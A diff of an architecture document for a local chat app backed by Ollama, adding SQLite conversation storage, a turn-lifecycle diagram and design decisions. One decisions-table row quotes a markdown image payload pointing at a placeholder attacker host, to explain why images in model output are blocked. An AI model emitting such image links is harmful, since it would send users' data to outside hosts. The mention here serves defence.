@@ -7,11 +7,12 @@
 | Dashboard | `src/LocalAI.Web` | Chat interaction, model selection, incremental rendering of the stream, loading/error/empty states, connection status, responsive layout. Holds conversation state in memory only. |
 | Web server | `infrastructure/docker/nginx.conf` | Serves the static SPA and reverse-proxies `/api` with buffering disabled. Sets CSP and security headers. Gives the browser a single origin, so no CORS is needed. |
 | HTTP API | `src/LocalAI.Api` | Endpoints, JSON contracts, validation responses, the SSE writer, Problem Details mapping, request-size and concurrency limits, configuration validation, CORS, Swagger. |
-| Domain | `src/LocalAI.Core` | `IChatProvider` abstraction, chat and model records, `ChatRequestValidator`, `ModelCatalog` (discovery, caching, model policy), `ChatService` (orchestration plus metrics), `ProviderStatusService` (health without inference), `InferenceMetrics`, `InferenceException`. No ASP.NET or Ollama dependency. |
+| Domain | `src/LocalAI.Core` | `IChatProvider` and `IConversationStore` abstractions, `ConversationService` (turn orchestration and persistence of every outcome), `HistoryWindow` (context selection), `ConversationLocks` (one generation per conversation), chat and model records, `ChatRequestValidator`, `ModelCatalog` (discovery, caching, model policy), `ChatService` (orchestration plus metrics), `ProviderStatusService` (health without inference), `InferenceMetrics`, `InferenceException`. No ASP.NET or Ollama dependency. |
+| Persistence | `src/LocalAI.Persistence` | EF Core `LocalAiDbContext` (SQLite), code-first migrations, `SqliteConversationStore : IConversationStore`. Applies migrations and enables WAL at startup. |
 | Provider | `src/LocalAI.Providers` | The only code that knows the Ollama protocol. `OllamaClient` handles HTTP, timeouts, NDJSON parsing, and error translation; `OllamaProvider` maps wire DTOs to domain records. |
 | Inference | `ollama` container | Model storage (volume `ollama-models`), loading, and generation. |
 
-Dependency direction: `Api → Core ← Providers`, with `Api` referencing `Providers` only for DI registration (`AddOllamaProvider`). Endpoints, contracts, and React code never see Ollama's JSON format.
+Dependency direction: `Api → Core ← Providers` and `Core ← Persistence`. `Api` references `Providers` and `Persistence` only for DI registration (`AddOllamaProvider`, `AddSqlitePersistence`). Endpoints, contracts, and React code never see Ollama's JSON format.
 
 ## Request lifecycle: `POST /api/chat/stream`
 
@@ -47,6 +48,48 @@ sequenceDiagram
 ```
 
 The key decision is that **all checks that can fail cheaply happen before the first byte is written**. Validation, model existence, model policy, and provider reachability all happen here, so they get proper HTTP status codes and Problem Details. Once the `200` and `start` event are sent, failures can only be reported in-band, as an `error` event.
+
+## Conversation turn lifecycle (Phase 2)
+
+`POST /api/conversations/{id}/messages/stream` follows the same streaming path as above, wrapped by `ConversationService`:
+
+```mermaid
+sequenceDiagram
+    participant B as Browser (useConversation)
+    participant A as API endpoint
+    participant CS as ConversationService
+    participant DB as SQLite store
+    participant S as ChatService → Ollama
+
+    B->>A: { model, content } — only the new message
+    A->>A: ValidateTurn → 400 (key "content")
+    A->>CS: BeginTurnAsync
+    CS->>CS: ConversationLocks.Acquire → 409 conversation_busy
+    CS->>DB: load conversation → 404 conversation_not_found
+    CS->>S: PrepareAsync (resolve model) → 404/503, nothing stored yet
+    CS->>DB: append user message (+ auto-title on first message)
+    CS->>CS: HistoryWindow.Select(stored history)
+    A-->>B: 200 SSE start {conversationId}
+    S-->>B: delta… (accumulated in CS)
+    alt done
+        CS->>DB: append assistant (complete, stats)
+    else client disconnect / Stop
+        CS->>DB: append assistant (stopped, partial text) — CancellationToken.None
+    else provider error
+        CS->>DB: append assistant (error, code, message, partial text)
+    end
+    CS->>CS: release lock
+```
+
+Design points:
+
+- **The server is the source of truth.** Clients can't inject or alter past turns, and a reload or dropped connection loses nothing. The browser reloads a conversation from `GET /api/conversations/{id}` when the URL (`#/chat/<id>`) changes.
+- **Every outcome is persisted.** The reply is saved with `CancellationToken.None`, so a cancelled request still stores its partial text. A storage failure at that point is logged and never masks the generation result.
+- **Nothing is stored for rejected requests.** The model is resolved before the user message is appended.
+- **The context window is bounded and newest-first.** All turns are stored, but only the newest that fit the message and character limits are sent. Failed replies are excluded; stopped partial replies are included.
+- **One generation per conversation.** An in-process lock prevents interleaved turns and deleting a conversation mid-stream. It assumes a single API instance, which SQLite requires anyway.
+- **Regenerate** deletes the last assistant reply and streams a new answer to the last user message (UI: Retry).
+- **Storage choices.** Timestamps are stored as UTC ticks (SQLite cannot order `DateTimeOffset` text). Enums are stored as readable strings. `(conversation_id, sequence)` is unique, and deleting a conversation cascades to its messages.
 
 ## Streaming data flow
 
@@ -145,4 +188,6 @@ Four independent signals, deliberately not collapsed into one:
 | Concurrency limit rather than a queue | Local hardware serves few generations at once. Rejecting fast (429) beats unbounded queueing. |
 | In-memory metrics | Honest, zero-dependency Phase 1 telemetry. Clearly labelled "since API start"; replaced by OpenTelemetry in Phase 2. |
 | Block images in model output | A crafted reply could embed `![](https://attacker/?q=<data>)`; not loading images closes that exfiltration channel. |
+| SQLite via EF Core for history | One file in a volume, no extra container, fine for a single host. The store sits behind `IConversationStore`, so PostgreSQL can replace it (e.g. with pgvector for Phase 3) without touching Core or the API. |
+| Server-side history | Integrity (clients can't rewrite context), durability of stopped and failed turns, and smaller requests. |
 | Targets `net8.0` | LTS requirement. Built and tested on the official `dotnet/sdk:8.0` image. |
